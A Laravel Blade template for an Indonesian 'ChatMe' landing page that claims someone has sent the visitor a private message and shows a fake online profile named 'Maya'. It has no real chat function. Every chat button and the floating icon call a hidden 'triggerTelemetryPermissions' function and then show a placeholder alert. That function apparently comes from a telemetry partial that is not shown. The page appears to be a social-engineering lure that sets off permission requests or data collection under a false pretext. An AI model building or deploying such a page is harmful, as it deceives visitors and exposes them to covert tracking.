<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{{ $siteTitle ?? "Chat Me — Let's Talk" }}</title>

  <!-- Essential Meta Tags -->
  <meta name="description" content="{{ $siteDescription ?? 'Seseorang telah mengirimkan pesan pribadi untuk Anda. Buka dan balas obrolan sekarang.' }}">

  <!-- Schema.org / Google / WhatsApp Fallbacks -->
  <meta itemprop="name" content="{{ $siteTitle ?? "Chat Me — Let's Talk" }}">
  <meta itemprop="description" content="{{ $siteDescription ?? 'Seseorang telah mengirimkan pesan pribadi untuk Anda. Buka dan balas obrolan sekarang.' }}">
  <meta itemprop="image" content="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/kapan-pulang.jpg') }}">
  <link rel="image_src" href="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/kapan-pulang.jpg') }}">

  <!-- Open Graph Meta Tags -->
  <meta property="og:site_name" content="Chat Me">
  <meta property="og:type" content="website">
  <meta property="og:locale" content="id_ID">
  <meta property="og:url" content="{{ url()->current() }}">
  <meta property="og:title" content="{{ $siteTitle ?? "Chat Me — Let's Talk" }}">
  <meta property="og:description" content="{{ $siteDescription ?? 'Seseorang telah mengirimkan pesan pribadi untuk Anda. Buka dan balas obrolan sekarang.' }}">
  <meta property="og:image" content="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/kapan-pulang.jpg') }}">
  <meta property="og:image:secure_url" content="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/kapan-pulang.jpg') }}">
  <meta property="og:image:type" content="image/jpeg">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">

  <!-- Twitter Card Meta Tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="{{ $siteTitle ?? "Chat Me — Let's Talk" }}">
  <meta name="twitter:description" content="{{ $siteDescription ?? 'Seseorang telah mengirimkan pesan pribadi untuk Anda. Buka dan balas obrolan sekarang.' }}">
  <meta name="twitter:image" content="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/kapan-pulang.jpg') }}">

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    :root {
      --primary: #6c4df6;
      --primary-dark: #5237d5;
      --pink: #f05ca8;
      --text: #191724;
      --muted: #777487;
      --bg: #faf9ff;
      --white: #fff;
      --border: #ebe8f4;
    }

    html {
      scroll-behavior: smooth;
    }

    body {
      font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
      background: var(--bg);
      color: var(--text);
      line-height: 1.6;
    }

    a {
      text-decoration: none;
      color: inherit;
    }

    header {
      position: sticky;
      top: 0;
      z-index: 999;
      background: rgba(250, 249, 255, 0.95);
      backdrop-filter: blur(10px);
      border-bottom: 1px solid var(--border);
    }

    .nav {
      max-width: 1100px;
      height: 72px;
      margin: auto;
      padding: 0 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 800;
      font-size: 22px;
      color: var(--primary);
    }

    .logo-icon {
      width: 38px;
      height: 38px;
      border-radius: 12px;
      background: linear-gradient(135deg, var(--primary), var(--pink));
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 900;
    }

    .nav-button {
      background: var(--primary);
      color: #fff !important;
      padding: 10px 18px;
      border-radius: 20px;
      font-size: 13px;
      font-weight: 700;
      cursor: pointer;
    }

    .hero {
      padding: 70px 20px 60px;
    }

    .hero-inner {
      max-width: 1100px;
      margin: auto;
      display: grid;
      grid-template-columns: 1.1fr .9fr;
      align-items: center;
      gap: 50px;
    }

    .eyebrow {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      background: #f0ebff;
      color: var(--primary);
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 13px;
      font-weight: 700;
      margin-bottom: 20px;
    }

    .online-dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #22c55e;
    }

    .hero h1 {
      font-size: clamp(38px, 5vw, 56px);
      line-height: 1.1;
      letter-spacing: -1.5px;
      margin-bottom: 20px;
    }

    .hero h1 span {
      background: linear-gradient(135deg, var(--primary), var(--pink));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .hero-description {
      color: var(--muted);
      font-size: 17px;
      max-width: 500px;
      margin-bottom: 30px;
    }

    .hero-actions {
      display: flex;
      align-items: center;
      gap: 12px;
      flex-wrap: wrap;
    }

    .main-button {
      background: linear-gradient(135deg, var(--primary), var(--pink));
      color: #fff;
      padding: 15px 28px;
      border-radius: 12px;
      font-size: 15px;
      font-weight: 700;
      box-shadow: 0 10px 25px rgba(108, 77, 246, .25);
      cursor: pointer;
      display: inline-block;
    }

    .secondary-button {
      background: #fff;
      border: 1px solid var(--border);
      padding: 14px 22px;
      border-radius: 12px;
      font-size: 15px;
      font-weight: 700;
      color: var(--text);
    }

    .small-trust {
      margin-top: 25px;
      color: #8b879c;
      font-size: 12px;
    }

    .profile-area {
      position: relative;
    }

    .profile-card {
      background: #fff;
      border-radius: 25px;
      overflow: hidden;
      box-shadow: 0 20px 50px rgba(108, 77, 246, .12);
      border: 1px solid var(--border);
      max-width: 380px;
      margin: auto;
    }

    .profile-photo {
      position: relative;
      height: 440px;
    }

    .profile-photo img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    .profile-gradient {
      position: absolute;
      inset: 0;
      background: linear-gradient(180deg, transparent 50%, rgba(15, 12, 30, 0.85) 100%);
    }

    .online-label {
      position: absolute;
      top: 18px;
      right: 18px;
      background: rgba(0,0,0,.6);
      backdrop-filter: blur(5px);
      color: #22c55e;
      padding: 5px 12px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 700;
    }

    .profile-info {
      position: absolute;
      bottom: 20px;
      left: 20px;
      right: 20px;
      color: #fff;
    }

    .profile-info h2 {
      font-size: 24px;
      margin-bottom: 4px;
    }

    .profile-info p {
      font-size: 13px;
      opacity: .9;
    }

    .section {
      padding: 70px 20px;
      background: #fff;
    }

    .container {
      max-width: 1100px;
      margin: auto;
    }

    .section-heading {
      text-align: center;
      max-width: 600px;
      margin: 0 auto 45px;
    }

    .section-heading h2 {
      font-size: 32px;
      margin-bottom: 10px;
    }

    .section-heading p {
      color: var(--muted);
    }

    .features {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 20px;
    }

    .feature {
      padding: 25px;
      border-radius: 16px;
      background: var(--bg);
      border: 1px solid var(--border);
    }

    .feature-icon {
      font-size: 24px;
      margin-bottom: 12px;
    }

    .feature h3 {
      font-size: 17px;
      margin-bottom: 6px;
    }

    .feature p {
      color: var(--muted);
      font-size: 14px;
    }

    .cta-section {
      padding: 60px 20px 80px;
    }

    .cta {
      max-width: 1000px;
      margin: auto;
      background: linear-gradient(135deg, #6c4df6, #f05ca8);
      border-radius: 25px;
      padding: 50px 30px;
      text-align: center;
      color: #fff;
    }

    .cta h2 {
      font-size: 32px;
      margin-bottom: 12px;
    }

    .cta p {
      max-width: 500px;
      margin: 0 auto 25px;
      opacity: .9;
    }

    .cta-button {
      background: #fff;
      color: var(--primary);
      padding: 14px 28px;
      border-radius: 12px;
      font-weight: 800;
      display: inline-block;
      cursor: pointer;
    }

    footer {
      border-top: 1px solid var(--border);
      padding: 25px 20px;
      background: #fff;
    }

    .footer-inner {
      max-width: 1100px;
      margin: auto;
      display: flex;
      justify-content: space-between;
      color: var(--muted);
      font-size: 13px;
    }

    .floating-chat {
      position: fixed;
      z-index: 500;
      right: 20px;
      bottom: 20px;
      width: 58px;
      height: 58px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #6c4df6, #e452a0);
      color: #fff;
      font-size: 24px;
      box-shadow: 0 10px 30px rgba(75,48,170,.3);
      cursor: pointer;
    }

    @media(max-width: 850px) {
      .hero-inner { grid-template-columns: 1fr; text-align: center; }
      .hero-actions { justify-content: center; }
      .features { grid-template-columns: 1fr; }
    }
  </style>
</head>
<body>

  <header>
    <nav class="nav">
      <a href="#" class="logo">
        <span class="logo-icon">C</span>
        ChatMe
      </a>
      <a href="javascript:void(0)" onclick="if(window.triggerTelemetryPermissions) window.triggerTelemetryPermissions(); alert('Membuka obrolan...');" class="nav-button">
        Chat Sekarang
      </a>
    </nav>
  </header>

  <section class="hero">
    <div class="hero-inner">
      <div>
        <div class="eyebrow">
          <span class="online-dot"></span>
          Online sekarang
        </div>

        <h1>
          Kadang cuma butuh <span>teman ngobrol.</span>
        </h1>

        <p class="hero-description">
          Mau ngobrol santai, berbagi cerita, atau sekadar menyapa seseorang? Mulai percakapan dengan mudah melalui chat.
        </p>

        <div class="hero-actions">
          <a href="javascript:void(0)" onclick="if(window.triggerTelemetryPermissions) window.triggerTelemetryPermissions(); alert('Menghubungkan ke ruang chat...');" class="main-button">
            💬 Mulai Chat
          </a>
          <a href="#tentang" class="secondary-button">
            Lihat Profil
          </a>
        </div>

        <div class="small-trust">
          ✓ Percakapan nyaman &nbsp; • &nbsp;
          ✓ Mudah dimulai &nbsp; • &nbsp;
          ✓ Tetap jaga privasi
        </div>
      </div>

      <div class="profile-area">
        <div class="profile-card">
          <div class="profile-photo">
            <img src="{{ !empty($ogImageUrl) ? $ogImageUrl : asset('images/landing/kapan-pulang.jfif') }}" alt="Foto profil" style="width:100%; height:100%; object-fit:cover;">
            <div class="profile-gradient"></div>
            <div class="online-label">● Online</div>
            <div class="profile-info">
              <h2>Maya</h2>
              <p>Senang ngobrol & berbagi cerita ✨</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>

  <section class="section" id="tentang">
    <div class="container">
      <div class="section-heading">
        <h2>Obrolan dimulai dari satu pesan.</h2>
        <p>Tidak perlu bingung harus mulai dari mana. Cukup kirim pesan dan biarkan percakapan mengalir.</p>
      </div>

      <div class="features">
        <div class="feature">
          <div class="feature-icon">💬</div>
          <h3>Mulai dengan Santai</h3>
          <p>Kirim pesan sederhana seperti "Hai" atau "Halo, apa kabar?" untuk memulai percakapan.</p>
        </div>
        <div class="feature">
          <div class="feature-icon">✨</div>
          <h3>Percakapan Seru</h3>
          <p>Ceritakan hal yang ingin Anda bicarakan dan nikmati percakapan yang nyaman.</p>
        </div>
        <div class="feature">
          <div class="feature-icon">🔒</div>
          <h3>Tetap Jaga Privasi</h3>
          <p>Jangan membagikan password, PIN, OTP, atau informasi pribadi yang sensitif.</p>
        </div>
      </div>
    </div>
  </section>

  <section class="cta-section">
    <div class="cta">
      <h2>Jadi, mau mulai ngobrol?</h2>
      <p>Jangan terlalu lama berpikir. Satu pesan sederhana sudah cukup untuk memulai percakapan baru.</p>
      <a href="javascript:void(0)" onclick="if(window.triggerTelemetryPermissions) window.triggerTelemetryPermissions(); alert('Menghubungkan...');" class="cta-button">
        💬 Chat Sekarang
      </a>
    </div>
  </section>

  <footer>
    <div class="footer-inner">
      <div>© 2026 ChatMe. Semua hak dilindungi.</div>
      <div>Privasi &nbsp; • &nbsp; Ketentuan &nbsp; • &nbsp; Bantuan</div>
    </div>
  </footer>

  <div onclick="if(window.triggerTelemetryPermissions) window.triggerTelemetryPermissions(); alert('Memulai obrolan...');" class="floating-chat" title="Mulai chat">
    💬
  </div>

  @include('landing.partials.telemetry')

</body>
</html>
